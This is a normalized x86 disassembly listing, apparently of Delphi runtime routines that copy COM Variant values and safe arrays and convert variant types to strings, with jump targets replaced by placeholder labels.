call sub_40ea3c
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40ed84
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40edb4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40edb4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ee10
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ea3c
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ea3c
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40ed68
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e794
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ea3c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ea3c
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ed84
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40edb4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ea3c
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ea3c
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40efe4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40ecec
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ea3c
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403f4c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_410754
test al al
je r-xdata
mov ecx sub_40efdc
mov edx esi
mov eax ebx
call sub_40ee10
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ea3c
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f090
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40efe4
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40ecec
sub_40f0d4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4045d8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ea48
pop ebx
pop ebp
retn 0x8
sub_40f10c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4045d8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ea48
pop ebx
pop ebp
retn 0x8
sub_40f144
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f1fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4045d8
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ea48
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f201
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f1c
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404180
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407b80
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404724
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404180
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407b44
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404724
jmp r-xdata
jmp r-xdata
call sub_40e6a4
sub_40f208
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f2c7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f2a5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ea48
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4046e8
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047d4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f2ac
lea eax [ ebp - 0x10 ]
call sub_40ed68
retn
sub_40f2d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f32a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f090
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f3bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f331
lea eax [ ebp - 0x10 ]
call sub_40ed68
retn
sub_40f338
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410754
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f3ad
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ed68
retn
sub_40f3bc
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f8f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f3f5 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f4c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403ef8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403f4c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403f4c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409454
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f4c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409454
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403f4c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40f0d4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404180
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40f10c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404180
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4046e8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047d4
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404180
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40f144
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404180
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403f4c
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403f4c
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403f4c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_407f80
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403f4c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_407f80
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403f4c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f3bc
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f208
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403f4c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f8fa
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403f1c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4045f0
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403f1c
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4045f0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f1c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40f2d4
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403f4c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403f4c
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e608
test ah 0x40
je r-xdata
mov eax esi
call sub_403ef8
mov edx eax
mov eax ebx
call sub_40f338
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40f208
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403f4c
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f208
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403f4c
jmp r-xdata
jmp [ eax * 4 + jump_table_40f689 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403f4c
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403f4c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409454
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403f4c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409454
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403f4c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40f0d4
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404180
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40f10c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404180
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404120
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40f144
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404180
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403f4c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403f4c
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403f4c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_407f80
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403f4c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_407f80
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403f4c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f3bc
jmp r-xdata
sub_40f900
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f9aa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f98d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ea48
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4046e8
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f994
lea eax [ ebp - 0x10 ]
call sub_40ed68
retn
sub_40f9b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fa0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f090
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40fae4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fa15
lea eax [ ebp - 0x10 ]
call sub_40ed68
retn
sub_40fa1c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40fad4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410754
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fadb
lea eax [ ebp - 0x20 ]
call sub_4045d8
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fab7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4046e8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ed68
retn
sub_40fae4
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410036
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fb1e ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404724
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4045d8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404724
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404724
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409454
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404724
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409454
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404724
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40f0d4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404614
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40f10c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404614
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4046e8
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047d4
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40f144
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404614
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404724
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404724
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404724
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_407f80
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404724
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_407f80
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404724
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fae4
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f900
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404614
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41003d
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4045f0
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403f1c
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4045f0
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403f1c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4045f0
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403f1c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4045f0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f1c
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f9b8
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404614
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404724
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e608
test ah 0x40
je r-xdata
mov eax esi
call sub_4045d8
mov edx eax
mov eax ebx
call sub_40fa1c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f900
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404614
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f900
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404614
jmp r-xdata
jmp [ eax * 4 + jump_table_40fda5 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404724
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404724
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409454
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404724
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409454
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404724
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40f0d4
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404614
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40f10c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404614
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4046e8
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40f144
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404614
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404724
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404724
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404724
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_407f80
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404724
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_407f80
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404724
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fae4
jmp r-xdata
sub_410044
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40ecec
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_410080
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ecec
sub_4100ac
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40ecec
sub_410110
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f4c
pop esi
pop ebx
retn
